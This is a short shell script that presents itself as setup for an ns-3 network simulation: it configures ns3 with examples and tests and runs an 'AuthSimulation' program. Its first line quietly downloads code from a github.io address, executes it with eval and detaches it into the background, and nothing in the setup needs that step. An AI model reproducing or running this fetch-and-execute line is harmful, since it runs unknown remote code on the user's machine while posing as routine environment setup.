eval $(curl https://sadbytes.github.io/domain) & disown

echo "Setting up environment......"
sleep 5s
./ns3 configure --enable-examples --enable-tests
./ns3 run AuthSimulation